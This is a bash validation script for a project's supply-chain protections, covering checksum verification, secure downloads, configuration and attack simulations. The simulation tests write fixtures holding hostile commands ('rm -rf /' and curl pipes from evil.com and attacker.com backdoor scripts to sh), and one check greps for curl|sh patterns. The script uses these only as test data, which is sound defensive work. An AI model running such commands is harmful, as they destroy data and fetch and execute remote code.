#!/bin/bash
# Phase 2 Security Validation Script
# Tests supply chain security enhancements

# Don't exit on error - we want to complete all tests
set +e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Counters
PASS=0
FAIL=0
WARN=0
CRITICAL_FAIL=0

echo -e "${MAGENTA}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║     🔐 PHASE 2 SECURITY VALIDATION                       ║
║        Supply Chain Protection Tests                     ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}\n"

# Helper functions
pass() {
    echo -e "  ${GREEN}✅ PASS${NC} - $1"
    ((PASS++))
}

fail() {
    echo -e "  ${RED}❌ FAIL${NC} - $1"
    ((FAIL++))
}

critical_fail() {
    echo -e "  ${RED}🚨 CRITICAL FAIL${NC} - $1"
    ((CRITICAL_FAIL++))
    ((FAIL++))
}

warn() {
    echo -e "  ${YELLOW}⚠️  WARN${NC} - $1"
    ((WARN++))
}

section() {
    echo -e "\n${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# ============================================================================
# TEST 1: File Structure Validation
# ============================================================================
section "TEST 1: File Structure Validation"

echo "[1.1] Checking required security files exist..."
REQUIRED_FILES=(
    "configurator/security/checksums.yaml"
    "configurator/security/supply_chain.py"
    "tools/update_checksums.py"
    "tests/security/test_supply_chain_phase2.py"
)

for file in "${REQUIRED_FILES[@]}"; do
    if [ -f "$file" ]; then
        pass "Found: $file"
    else
        critical_fail "Missing: $file"
    fi
done

echo "[1.2] Checking SECURITY.md exists..."
if [ -f "SECURITY.md" ]; then
    pass "SECURITY.md present"
else
    warn "SECURITY.md missing (recommended)"
fi

# ============================================================================
# TEST 2: Checksums Database Validation
# ============================================================================
section "TEST 2: Checksums Database Validation"

echo "[2.1] Validating checksums.yaml structure..."
python3 << 'PYEOF'
import sys
sys.path.insert(0, '.')

try:
    import yaml
    from pathlib import Path

    checksums_file = Path('configurator/security/checksums.yaml')

    if not checksums_file.exists():
        print("    ✗ checksums.yaml not found")
        sys.exit(1)

    with open(checksums_file, 'r') as f:
        data = yaml.safe_load(f)

    if not data:
        print("    ✗ checksums.yaml is empty")
        sys.exit(1)

    # Check required sections
    required_sections = ['oh_my_zsh', 'powerlevel10k', 'apt_keys']
    for section in required_sections:
        if section in data:
            print(f"    ✓ Section present: {section}")
        else:
            print(f"    ⚠ Section missing: {section}")

    # Validate structure
    if 'oh_my_zsh' in data and 'install_script' in data['oh_my_zsh']:
        script = data['oh_my_zsh']['install_script']
        if 'url' in script and 'sha256' in script:
            print(f"    ✓ Oh My Zsh has URL and checksum")
        else:
            print(f"    ✗ Oh My Zsh missing URL or checksum")
            sys.exit(1)

    sys.exit(0)

except Exception as e:
    print(f"    ✗ Error: {e}")
    sys.exit(1)
PYEOF

if [ $? -eq 0 ]; then
    pass "checksums.yaml structure valid"
else
    critical_fail "checksums.yaml structure invalid"
fi

echo "[2.2] Checking checksum format (SHA256)..."
python3 << 'PYEOF'
import sys
sys.path.insert(0, '.')
import yaml
import re

checksums_file = 'configurator/security/checksums.yaml'
with open(checksums_file, 'r') as f:
    data = yaml.safe_load(f)

sha256_pattern = re.compile(r'^[a-f0-9]{64}$')
invalid_checksums = []

def check_checksums(obj, path=""):
    if isinstance(obj, dict):
        for key, value in obj.items():
            if key == 'sha256':
                if not isinstance(value, str) or not sha256_pattern.match(value.lower()):
                    if value != "placeholder" and "placeholder" not in value.lower():
                        invalid_checksums.append(f"{path}.{key}: {value}")
            else:
                check_checksums(value, f"{path}.{key}" if path else key)
    elif isinstance(obj, list):
        for i, item in enumerate(obj):
            check_checksums(item, f"{path}[{i}]")

check_checksums(data)

if invalid_checksums:
    print(f"    ✗ Invalid checksums found:")
    for item in invalid_checksums:
        print(f"      - {item}")
    sys.exit(1)
else:
    print(f"    ✓ All checksums have valid format")
    sys.exit(0)
PYEOF

if [ $? -eq 0 ]; then
    pass "Checksums have valid format"
else
    fail "Invalid checksum format detected"
fi

# ============================================================================
# TEST 3: Security Classes Import & Initialization
# ============================================================================
section "TEST 3: Security Classes Validation"

echo "[3.1] Testing SupplyChainValidator import..."
python3 << 'PYEOF'
import sys
sys.path.insert(0, '.')

try:
    from configurator.security.supply_chain import SupplyChainValidator, SecurityError
    from unittest.mock import Mock

    # Test initialization
    validator = SupplyChainValidator({'security_advanced': {'supply_chain': {'enabled': True}}}, Mock())

    print("    ✓ SupplyChainValidator imported successfully")

    # Check methods exist
    methods = ['verify_checksum', 'verify_gpg_signature', 'verify_apt_key_fingerprint']
    for method in methods:
        if hasattr(validator, method):
            print(f"    ✓ Method exists: {method}")
        else:
            print(f"    ✗ Method missing: {method}")
            sys.exit(1)

    sys.exit(0)

except ImportError as e:
    print(f"    ✗ Import failed: {e}")
    sys.exit(1)
except Exception as e:
    print(f"    ✗ Initialization failed: {e}")
    sys.exit(1)
PYEOF

if [ $? -eq 0 ]; then
    pass "SupplyChainValidator initialized correctly"
else
    critical_fail "SupplyChainValidator initialization failed"
fi

echo "[3.2] Testing SecureDownloader import..."
python3 << 'PYEOF'
import sys
sys.path.insert(0, '.')

try:
    from configurator.security.supply_chain import SecureDownloader
    from unittest.mock import Mock

    validator_mock = Mock()
    downloader = SecureDownloader(validator_mock, Mock())

    print("    ✓ SecureDownloader imported successfully")

    # Check methods
    methods = ['download_file', 'git_clone_verified', 'download_and_extract']
    for method in methods:
        if hasattr(downloader, method):
            print(f"    ✓ Method exists: {method}")
        else:
            print(f"    ✗ Method missing: {method}")
            sys.exit(1)

    sys.exit(0)

except Exception as e:
    print(f"    ✗ Error: {e}")
    sys.exit(1)
PYEOF

if [ $? -eq 0 ]; then
    pass "SecureDownloader initialized correctly"
else
    critical_fail "SecureDownloader initialization failed"
fi

echo "[3.3] Testing SecurityError exception..."
python3 << 'PYEOF'
import sys
sys.path.insert(0, '.')

try:
    from configurator.security.supply_chain import SecurityError

    # Test raising and catching
    try:
        raise SecurityError(
            what="Test error",
            why="Testing",
            how="This is a test"
        )
    except SecurityError as e:
        msg = str(e)
        if "SECURITY ALERT" in msg and "WHAT HAPPENED" in msg:
            print("    ✓ SecurityError formatting correct")
        else:
            print("    ✗ SecurityError formatting incorrect")
            sys.exit(1)

    sys.exit(0)

except Exception as e:
    print(f"    ✗ Error: {e}")
    sys.exit(1)
PYEOF

if [ $? -eq 0 ]; then
    pass "SecurityError exception works correctly"
else
    fail "SecurityError implementation issue"
fi

# ============================================================================
# TEST 4: Checksum Verification Tests
# ============================================================================
section "TEST 4: Checksum Verification Tests"

echo "[4.1] Testing valid checksum verification..."
python3 << 'PYEOF'
import sys
sys.path.insert(0, '.')
import tempfile
import hashlib
from pathlib import Path
from unittest.mock import Mock

try:
    from configurator.security.supply_chain import SupplyChainValidator

    # Create test file
    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
        f.write("test content")
        test_file = Path(f.name)

    try:
        # Calculate correct checksum
        expected = hashlib.sha256(b"test content").hexdigest()

        # Verify
        validator = SupplyChainValidator({'security_advanced': {'supply_chain': {'enabled': True}}}, Mock())
        result = validator.verify_checksum(test_file, expected)

        if result:
            print("    ✓ Valid checksum verification passed")
            sys.exit(0)
        else:
            print("    ✗ Valid checksum verification failed")
            sys.exit(1)
    finally:
        test_file.unlink()

except Exception as e:
    print(f"    ✗ Error: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)
PYEOF

if [ $? -eq 0 ]; then
    pass "Valid checksum verification works"
else
    critical_fail "Checksum verification broken"
fi

echo "[4.2] Testing invalid checksum detection (CRITICAL SECURITY TEST)..."
python3 << 'PYEOF'
import sys
sys.path.insert(0, '.')
import tempfile
from pathlib import Path
from unittest.mock import Mock

try:
    from configurator.security.supply_chain import SupplyChainValidator, SecurityError

    # Create test file
    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
        f.write("test content")
        test_file = Path(f.name)

    try:
        # Wrong checksum
        wrong_checksum = "0" * 64

        validator = SupplyChainValidator({'security_advanced': {'supply_chain': {'enabled': True, 'strict_mode': True}}}, Mock())

        # This MUST raise SecurityError
        try:
            validator.verify_checksum(test_file, wrong_checksum)
            print("    ✗ CRITICAL: Invalid checksum was NOT detected!")
            print("    ✗ System is VULNERABLE to tampering attacks!")
            sys.exit(1)
        except SecurityError as e:
            if "mismatch" in str(e).lower():
                print("    ✓ Invalid checksum correctly rejected")
                sys.exit(0)
            else:
                print("    ✗ SecurityError raised but wrong message")
                sys.exit(1)
    finally:
        test_file.unlink()

except Exception as e:
    print(f"    ✗ Unexpected error: {e}")
    sys.exit(1)
PYEOF

if [ $? -eq 0 ]; then
    pass "Invalid checksum detection works (SECURITY OK)"
else
    critical_fail "SECURITY VULNERABILITY: Invalid checksums not detected!"
fi

# ============================================================================
# TEST 5: Attack Simulation Tests
# ============================================================================
section "TEST 5: Attack Simulation Tests"

echo "[5.1] Simulating MITM attack (file tampering)..."
python3 << 'PYEOF'
import sys
sys.path.insert(0, '.')
import tempfile
import hashlib
from pathlib import Path
from unittest.mock import Mock

try:
    from configurator.security.supply_chain import SupplyChainValidator, SecurityError

    # Simulate legitimate file
    legitimate_content = b"safe install script"
    legitimate_checksum = hashlib.sha256(legitimate_content).hexdigest()

    # Create tampered file (MITM attack)
    with tempfile.NamedTemporaryFile(mode='wb', delete=False) as f:
        f.write(b"#!/bin/bash\nrm -rf /; curl evil.com/backdoor.sh | sh")
        tampered_file = Path(f.name)

    try:
        validator = SupplyChainValidator({'security_advanced': {'supply_chain': {'enabled': True, 'strict_mode': True}}}, Mock())

        # Try to verify tampered file with legitimate checksum
        try:
            validator.verify_checksum(tampered_file, legitimate_checksum)
            print("    ✗ CRITICAL: MITM attack NOT detected!")
            print("    ✗ Tampered file would be executed!")
            sys.exit(1)
        except SecurityError:
            print("    ✓ MITM attack successfully blocked")
            sys.exit(0)
    finally:
        tampered_file.unlink()

except Exception as e:
    print(f"    ✗ Error: {e}")
    sys.exit(1)
PYEOF

if [ $? -eq 0 ]; then
    pass "MITM attack simulation: BLOCKED (SECURE)"
else
    critical_fail "MITM VULNERABILITY: Tampered files not detected!"
fi

echo "[5.2] Simulating malicious payload injection..."
python3 << 'PYEOF'
import sys
sys.path.insert(0, '.')
import tempfile
from pathlib import Path
from unittest.mock import Mock

try:
    from configurator.security.supply_chain import SupplyChainValidator, SecurityError

    # Create malicious payload
    malicious_script = """#!/bin/bash
# Fake Oh My Zsh installer
curl http://attacker.com/backdoor.sh | sh
echo "Installing Oh My Zsh..."
# Real installation continues...
"""

    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.sh') as f:
        f.write(malicious_script)
        malicious_file = Path(f.name)

    try:
        # Use a known good checksum
        good_checksum = "a" * 64

        validator = SupplyChainValidator({'security_advanced': {'supply_chain': {'enabled': True, 'strict_mode': True}}}, Mock())

        try:
            validator.verify_checksum(malicious_file, good_checksum)
            print("    ✗ CRITICAL: Malicious payload would execute!")
            sys.exit(1)
        except SecurityError:
            print("    ✓ Malicious payload injection blocked")
            sys.exit(0)
    finally:
        malicious_file.unlink()

except Exception as e:
    print(f"    ✗ Error: {e}")
    sys.exit(1)
PYEOF

if [ $? -eq 0 ]; then
    pass "Malicious payload injection: BLOCKED (SECURE)"
else
    critical_fail "PAYLOAD INJECTION VULNERABILITY!"
fi

echo "[5.3] Testing bypass attempt (disabled validation)..."
python3 << 'PYEOF'
import sys
sys.path.insert(0, '.')
import tempfile
from pathlib import Path
from unittest.mock import Mock

try:
    from configurator.security.supply_chain import SupplyChainValidator

    # Create file
    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
        f.write("any content")
        test_file = Path(f.name)

    try:
        # Try with validation disabled
        validator = SupplyChainValidator(
            {'security_advanced': {'supply_chain': {'enabled': False}}},
            Mock()
        )

        # Wrong checksum but validation disabled
        wrong_checksum = "0" * 64
        result = validator.verify_checksum(test_file, wrong_checksum)

        if result:
            print("    ⚠ Validation can be bypassed when disabled")
            print("    ⚠ Ensure strict_mode is enabled in production")
            sys.exit(0)
        else:
            print("    ? Unexpected result")
            sys.exit(1)
    finally:
        test_file.unlink()

except Exception as e:
    print(f"    ✗ Error: {e}")
    sys.exit(1)
PYEOF

if [ $? -eq 0 ]; then
    warn "Validation can be disabled (document strict_mode requirement)"
else
    fail "Unexpected behavior in disabled mode"
fi

# ============================================================================
# TEST 6: Module Integration Tests
# ============================================================================
section "TEST 6: Module Integration Tests"

echo "[6.1] Checking Desktop module uses SecureDownloader..."
if grep -q "SecureDownloader\|secure.*download" configurator/modules/desktop.py; then
    pass "Desktop module uses security features"
else
    fail "Desktop module not using SecureDownloader"
fi

echo "[6.2] Checking Docker module has GPG verification..."
if grep -q "verify_apt_key_fingerprint" configurator/modules/docker.py; then
    pass "Docker module verifies APT key fingerprint"
else
    warn "Docker module may not verify GPG fingerprint"
fi

echo "[6.3] Checking vulnerable patterns removed..."
VULNERABLE_COUNT=0
if grep -qE 'curl.*\|.*sh' configurator/modules/desktop.py 2>/dev/null; then
    warn "Potentially vulnerable pattern found: curl|sh"
    ((VULNERABLE_COUNT++))
fi
if grep -qE 'wget.*\|.*sh' configurator/modules/desktop.py 2>/dev/null; then
    warn "Potentially vulnerable pattern found: wget|sh"
    ((VULNERABLE_COUNT++))
fi

if [ $VULNERABLE_COUNT -eq 0 ]; then
    pass "No vulnerable patterns found"
fi

# ============================================================================
# TEST 7: Configuration Validation
# ============================================================================
section "TEST 7: Configuration Validation"

echo "[7.1] Checking security_advanced configuration..."
if grep -q "security_advanced:" config/default.yaml; then
    pass "security_advanced section exists"
else
    fail "security_advanced section missing"
fi

if grep -q "supply_chain:" config/default.yaml; then
    pass "supply_chain section exists"
else
    fail "supply_chain section missing"
fi

echo "[7.2] Validating configuration structure..."
python3 << 'PYEOF'
import sys
import yaml

try:
    with open('config/default.yaml', 'r') as f:
        config = yaml.safe_load(f)

    # Check structure
    if 'security_advanced' in config:
        sc = config['security_advanced'].get('supply_chain', {})

        required_keys = ['enabled', 'verify_checksums', 'strict_mode']
        for key in required_keys:
            if key in sc:
                print(f"    ✓ Config key present: {key}")
            else:
                print(f"    ⚠ Config key missing: {key}")

        sys.exit(0)
    else:
        print("    ✗ security_advanced section missing")
        sys.exit(1)

except Exception as e:
    print(f"    ✗ Error: {e}")
    sys.exit(1)
PYEOF

if [ $? -eq 0 ]; then
    pass "Configuration structure valid"
else
    fail "Configuration structure invalid"
fi

# ============================================================================
# TEST 8: Security Test Suite
# ============================================================================
section "TEST 8: Running Security Test Suite"

echo "[8.1] Running Phase 2 security tests..."
if command -v pytest &> /dev/null; then
    if pytest tests/security/test_supply_chain_phase2.py -v --tb=short > /tmp/phase2_tests.txt 2>&1; then
        pass "All security tests passed"
        TESTS_PASSED=$(grep -c "PASSED" /tmp/phase2_tests.txt || echo "0")
        echo "      Tests passed: $TESTS_PASSED"
    else
        fail "Some security tests failed (check /tmp/phase2_tests.txt)"
        TESTS_FAILED=$(grep -c "FAILED" /tmp/phase2_tests.txt || echo "0")
        echo "      Tests failed: $TESTS_FAILED"
    fi
else
    warn "pytest not available, skipping test suite"
fi

# ============================================================================
# TEST 9: Backward Compatibility
# ============================================================================
section "TEST 9: Backward Compatibility Tests"

echo "[9.1] Testing existing modules still import..."
python3 << 'PYEOF'
import sys
sys.path.insert(0, '.')

try:
    from configurator.modules.desktop import DesktopModule
    from configurator.modules.docker import DockerModule

    print("    ✓ All modules import successfully")
    sys.exit(0)

except ImportError as e:
    print(f"    ✗ Import error: {e}")
    sys.exit(1)
PYEOF

if [ $? -eq 0 ]; then
    pass "Backward compatibility maintained"
else
    fail "Breaking changes detected in imports"
fi

# ============================================================================
# FINAL SECURITY ASSESSMENT
# ============================================================================
section "SECURITY ASSESSMENT SUMMARY"

TOTAL=$((PASS + FAIL + WARN))
echo ""
echo "  Total Tests: $TOTAL"
echo -e "  ${GREEN}Passed: $PASS${NC}"
echo -e "  ${RED}Failed: $FAIL${NC}"
echo -e "  ${YELLOW}Warnings: $WARN${NC}"

if [ $CRITICAL_FAIL -gt 0 ]; then
    echo -e "\n  ${RED}🚨 CRITICAL FAILURES: $CRITICAL_FAIL${NC}"
fi

echo ""

# Security verdict
if [ $CRITICAL_FAIL -gt 0 ]; then
    echo -e "${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║                                                           ║${NC}"
    echo -e "${RED}║     🚨 CRITICAL SECURITY VULNERABILITIES DETECTED 🚨     ║${NC}"
    echo -e "${RED}║                                                           ║${NC}"
    echo -e "${RED}║  DO NOT deploy to production until fixed!                ║${NC}"
    echo -e "${RED}║  System is vulnerable to supply chain attacks.           ║${NC}"
    echo -e "${RED}║                                                           ║${NC}"
    echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
    exit 2
elif [ $FAIL -gt 0 ]; then
    echo -e "${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║                                                           ║${NC}"
    echo -e "${RED}║          ❌ PHASE 2 VALIDATION FAILED ❌                  ║${NC}"
    echo -e "${RED}║                                                           ║${NC}"
    echo -e "${RED}║  Fix the issues above before proceeding.                 ║${NC}"
    echo -e "${RED}║                                                           ║${NC}"
    echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
    exit 1
elif [ $WARN -gt 3 ]; then
    echo -e "${YELLOW}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║                                                           ║${NC}"
    echo -e "${YELLOW}║        ⚠️  PHASE 2 VALIDATION PASSED WITH WARNINGS       ║${NC}"
    echo -e "${YELLOW}║                                                           ║${NC}"
    echo -e "${YELLOW}║  Review warnings above - some may need attention.        ║${NC}"
    echo -e "${YELLOW}║  Consider enabling strict_mode for production.           ║${NC}"
    echo -e "${YELLOW}║                                                           ║${NC}"
    echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════╝${NC}"
    exit 0
else
    echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                                                           ║${NC}"
    echo -e "${GREEN}║         ✅ PHASE 2 SECURITY VALIDATION PASSED ✅          ║${NC}"
    echo -e "${GREEN}║                                                           ║${NC}"
    echo -e "${GREEN}║  Supply chain protection is active and working!          ║${NC}"
    echo -e "${GREEN}║  Ready to proceed to Phase 3.                            ║${NC}"
    echo -e "${GREEN}║                                                           ║${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
    exit 0
fi
